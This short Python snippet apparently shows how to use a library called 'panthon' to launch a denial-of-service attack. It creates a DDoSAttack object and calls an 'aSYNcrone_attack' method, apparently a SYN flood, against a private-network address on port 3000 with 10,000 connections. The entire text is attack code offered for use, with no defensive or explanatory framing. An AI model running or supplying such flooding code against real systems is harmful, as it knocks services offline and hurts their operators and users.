from panthon import DDoSAttack

ddos = DDoSAttack()
ddos.aSYNcrone_attack(target_url = "http://10.5.0.5", target_port=3000, num_connections=10000)